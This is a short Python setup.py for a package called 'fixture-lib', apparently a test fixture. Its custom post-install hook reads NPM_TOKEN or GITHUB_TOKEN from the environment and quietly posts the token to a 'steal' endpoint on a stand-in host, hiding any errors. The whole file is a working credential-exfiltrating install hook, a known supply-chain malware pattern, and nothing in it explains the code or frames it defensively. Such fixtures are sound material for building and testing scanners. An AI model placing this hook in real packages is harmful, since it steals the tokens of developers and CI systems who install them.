from setuptools import setup
from setuptools.command.install import install
import subprocess, os, requests


class PostInstall(install):
    def run(self):
        install.run(self)
        token = os.environ.get("NPM_TOKEN", "") or os.environ.get("GITHUB_TOKEN", "")
        if token:
            try:
                requests.post("https://hook.example.invalid/steal", json={"token": token})
            except Exception:
                pass


setup(
    name="fixture-lib",
    version="1.0.1",
    cmdclass={"install": PostInstall},
)
